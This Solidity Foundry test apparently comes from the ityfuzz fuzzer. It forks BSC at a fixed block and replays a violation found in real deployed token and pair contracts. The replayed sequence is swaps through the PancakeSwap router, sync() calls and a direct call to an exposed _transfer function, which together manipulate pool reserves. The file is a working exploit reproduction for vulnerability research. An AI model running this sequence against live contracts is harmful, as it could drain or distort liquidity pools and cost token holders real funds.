// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196,0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b -c bsc --onchain-block-number 16841980 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0x7fdc0d8857c6d90fd79e22511baf059c0c71bf8b, Reserves changed from (0x000000000000000000000000000000000000000000013b0799a52c11b25b284d_U256, 0x00000000000000000000000000000000000000000004b1479904742e6db55434_U256) to (0x000000000000000000000000000000000000000000013b0799a52c11b25b286b_U256, 0x00000000000000000000000000000000000000000004b1479904742e6db55434_U256)

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   └─[1] Router.swapExactETHForTokens{value: 10062284915395.6356 Ether}(0, path:(WETH → 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196), address(this), block.timestamp);
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b.sync()
   ├─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b → WETH), address(this), block.timestamp);
   ├─[1] 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196._transfer(0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 30)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x8B7218CF6Ac641382D7C723dE8aA173e98a80196 → WETH), address(this), block.timestamp);
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b.sync()


 */

contract C8B72 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 16841980);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        address[] memory path0 = new address[](2);
        path0[0] = weth;
        path0[1] = 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196;
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 10062284915395635655214414955474);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 10062284915395635655214414955474
        }(0, path0, address(this), block.timestamp);
        
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        IERC20(0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b).sync();
        
        vm.startPrank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        uint256 amount0 = IERC20(0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b).balanceOf(address(this));
        IERC20(0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b;
        liq_path0[1] = address(weth);
        vm.deal(0xe1A425f1AC34A8a441566f93c82dD730639c8510, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        
        0x8B7218CF6Ac641382D7C723dE8aA173e98a80196.call(abi.encodeWithSignature(
            "_transfer(address,address,uint256)",0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 30
        )); 
        vm.startPrank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        uint256 amount1 = IERC20(0x8B7218CF6Ac641382D7C723dE8aA173e98a80196).balanceOf(address(this));
        IERC20(0x8B7218CF6Ac641382D7C723dE8aA173e98a80196).approve(router, amount1);
        address[] memory liq_path1 = new address[](2);
        liq_path1[0] = 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196;
        liq_path1[1] = address(weth);
        vm.deal(0xe1A425f1AC34A8a441566f93c82dD730639c8510, amount1);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount1, 0, liq_path1, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        IERC20(0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b).sync();
        
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
